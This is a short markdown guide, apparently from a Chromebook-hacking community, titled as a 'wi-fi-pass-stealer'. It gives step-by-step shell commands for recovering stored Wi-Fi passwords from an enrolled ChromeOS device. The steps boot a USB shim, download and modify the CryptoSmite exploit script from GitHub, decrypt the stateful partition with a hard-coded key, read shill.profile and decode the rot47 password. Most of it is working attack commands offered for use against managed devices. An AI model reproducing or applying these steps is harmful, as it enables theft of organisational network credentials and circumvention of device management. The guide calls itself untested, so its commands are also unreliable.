---
title: wi-fi-pass-stealer-kv2
---

-e 
Notes:
-> THIS IS AN EXPERIMENTAL KAJIG, AND HAS NOT BEEN TESTED
-> Unless net-export and local file viewing are blocked, you're better off doing something else (file:///var/lib/devicesettings/policy.* should also contain the policies)

Overview:
-> Basically, what we do is use CryptoSmite's backups to get a readable stateful, and then read the policy's networks from that

Requirements:
-> Device has auto-enrollment
-> Device is on kernver 2
-> An external USB stick and a flashing method
-> A decent amount of ChromeOS hacking knowledge (this is an experimental kajig -- no skids allowed!)

Steps:
1. Downgrade to the lowest available ChromeOS version.
2. Install a shim on your USB (SH1MMER and shimboot both work).
3. Boot your USB.
4. At a shell, run curl -LO https://raw.githubusercontent.com/FWSmasher/CryptoSmite/main/cryptosmite.sh, as well as curl -LO https://github.com/FWSmasher/CryptoSmite/raw/main/cryptsetup_x86_64
5. In your editor of choice, remove line 123 from cryptosmite.sh.
6. Run the script as normal.
7. Restart the machine.
8. Powerwash as normal.
9. Don't do anything at the enrollment screen.
10. Once enrollment is completed, go back into the shim.
11. Run mkdir /mnt/{encstateful,stateful_part}
12. Run base64 -d 24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l > stateful_key
13. Run mount /dev/mmcblk0p1 /mnt/stateful_part # should be the stateful part; if not, edit as appropriate
14. Run ${CRYPTSETUP_PATH} open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file stateful_key /mnt/stateful_part/encrypted.block encstateful
15. Run mount /dev/mapper/encstateful /mnt/encstateful
16. Run more /home/root/*/shill/shill.profile
17. Find the Password=rot47 line and copy the text below it
18. Run echo ${TEXT} | tr '!-~' 'P-~!-O'

Credits:
symlink
Titanium Network
